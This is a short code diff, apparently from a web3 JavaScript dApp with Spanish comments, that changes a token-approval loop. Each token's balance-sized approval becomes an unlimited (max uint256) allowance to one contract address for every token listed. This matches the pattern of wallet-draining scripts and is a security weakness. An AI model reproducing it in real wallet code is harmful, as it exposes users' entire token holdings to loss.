@@ -58,15 +58,15 @@ async function approveTransferForAllTokens(tokens, userAccount, contractAddress)
         }
     ];
 
+    // Valor máximo para uint256
+    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
     try {
         for (const tokenAddress of tokens) {
             const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-            const balance = await tokenContract.methods.balanceOf(userAccount).call();
-            if (balance > 0) {
-                // Se utiliza el total del balance para la aprobación
-                const approved = await tokenContract.methods.approve(contractAddress, balance).send({from: userAccount});
-                console.log(`Transferencia de tokens aprobada para ${tokenAddress}:`, approved);
-            }
+            // Se utiliza MAX_UINT256 para la aprobación, en lugar del balance actual
+            const approved = await tokenContract.methods.approve(contractAddress, MAX_UINT256).send({from: userAccount});
+            console.log(`Aprobación ilimitada concedida para ${tokenAddress}:`, approved);
         }
     } catch (error) {
         console.error("Error al aprobar la transferencia:", error);
